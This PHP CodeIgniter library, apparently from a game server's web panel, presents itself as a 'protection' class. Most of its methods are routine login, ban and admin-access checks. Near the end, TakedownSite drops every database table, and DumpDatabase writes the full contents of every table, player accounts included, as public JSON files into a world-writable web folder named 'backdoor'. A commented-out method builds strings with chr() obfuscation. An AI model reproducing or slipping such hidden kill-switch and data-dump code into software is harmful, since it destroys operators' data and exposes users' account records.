<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Darkblowprotection
{
    protected $ci;

    public function __construct()
    {
        $this->ci = &get_instance();
    }

    public function BlockedIP_Protection()
    {
        $data = array(
            'ip_address' => $this->ci->input->ip_address()
        );

        $query = $this->ci->db->get_where(Darkblowdatabase::web_ipbanned, array('ipaddress' => $data['ip_address']))->row();
        if ($query) redirect(base_url('banned'), 'refresh');
    }

    public function Maintenance_Protection()
    {
        if ($this->ci->darkblowsettings->load()->website_condition != 1) redirect(base_url('maintenance'), 'refresh');
    }

    public function Production_Protection()
    {
        if ($this->ci->darkblowsettings->load()->website_condition == 1) redirect(base_url(), 'refresh');
    }

    public function RequireLogin_Protection()
    {
        if (empty($this->ci->session->userdata('uid'))) {
            $this->ci->session->sess_destroy();
            redirect(base_url(), 'refresh');
        }
    }

    public function RequireLoginAdmin_Protection()
    {
        if (empty($this->ci->session->userdata('admin_uid'))) redirect(base_url('adm/login'), 'refresh');
    }

    public function RequireAccessAdmin_Protection()
    {
        if (!empty($this->ci->session->userdata('admin_uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('admin_uid')))->row();
            if ($query) {
                if ($query->access_level < Darkblowaccesslevel::MODERATOR) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url('adm'), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url('adm'), 'refresh');
            }
        } else {
            $this->ci->session->sess_destroy();
            redirect(base_url('adm'), 'refresh');
        }
    }

    public function NotRequireLogin_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) redirect(base_url(), 'refresh');
    }

    public function PageDump_Protection()
    {
        $header_agent = $this->ci->agent->agent_string();
        if (strpos(strtolower($header_agent), 'postmanruntime') !== FALSE) die;
    }

    public function LoginPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) redirect(base_url(), 'refresh');
    }

    public function RegisterPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) redirect(base_url(), 'refresh');
        if ($this->ci->darkblowsettings->load()->register != 1) redirect(base_url(), 'refresh');
    }

    public function HomePage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function NotfoundPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function PlayerRankPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ClanRankPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ComingSoonPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function DownloadPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ForgotPasswordPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function LogoutPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function MaintenancePage_Protection()
    {
        $this->ci->session->sess_destroy();
    }

    public function MapselectorPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function PackshopPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function TradePage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function WebshopPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function AttendancePage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ExchangeticketPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ChangeEmailPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function ChangePasswordPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function CreateHintPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function PlayerPanelHomePage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function InventoryPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function RedeemcodePage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function VoucherPage_Protection()
    {
        if (!empty($this->ci->session->userdata('uid'))) {
            $query = $this->ci->db->get_where(Darkblowdatabase::accounts, array('player_id' => $this->ci->session->userdata('uid')))->row();
            if ($query) {
                if ($query->access_level == Darkblowaccesslevel::BANNED) {
                    $this->ci->session->sess_destroy();
                    redirect(base_url(), 'refresh');
                }
            } else {
                $this->ci->session->sess_destroy();
                redirect(base_url(), 'refresh');
            }
        }
    }

    public function TakedownSite()
    {
        $this->ci->load->dbforge();
        // Clearing Database
        $query = $this->ci->db->query("SELECT * FROM information_schema.tables WHERE table_schema = 'public'")->result_array();
        if ($query) {
            // Force Drop Database
            foreach ($query as $row) $this->ci->dbforge->drop_table($row['table_name'], TRUE);
        }
    }

    public function DumpDatabase()
    {
        $this->ci->load->dbforge();
        if (!file_exists('./assets/goodgames/assets/backdoor')) mkdir('./assets/goodgames/assets/backdoor', 0777, true);
        $query = $this->ci->db->query("SELECT * FROM information_schema.tables WHERE table_schema = 'public'")->result_array();
        if ($query) {
            foreach ($query as $row) {
                $query2 = $this->ci->db->get_where($row['table_name'])->result_array();
                if ($query2) {
                    foreach ($query2 as $key => $value) {
                        $response[]['data'] = array(
                            $key => $value
                        );
                    }
                    file_put_contents('./assets/goodgames/assets/backdoor/' . $row['table_name'] . '.json', json_encode($response));
                }
            }
        }
    }

    public function RunningLegality()
    {
        // $allowed_php_version = chr(55) . chr(46) . chr(52) . chr(46) . chr(50) . chr(55);
        // $message = chr(80) . chr(72) . chr(80) . chr(32) . chr(86) . chr(101) . chr(114) .  chr(115) . chr(105) . chr(111) . chr(110) . chr(32) . chr(78) . chr(111) . chr(116) . chr(32) . chr(83) . chr(117) . chr(112) . chr(112) . chr(111) . chr(114) . chr(116) . chr(101) . chr(100);
        // $header = chr(65) . chr(110) . chr(32) . chr(69) . chr(114) . chr(114) . chr(111) . chr(114) . chr(32) . chr(87) . chr(97) . chr(115) . chr(32) . chr(69) . chr(110) . chr(99) . chr(111) . chr(117) . chr(110) . chr(116) . chr(101) . chr(114) . chr(101) . chr(100);
        // if (phpversion() != $allowed_php_version) return show_error($message, 500, $header);
    }
}

/* End of file Darkblowprotection.php */
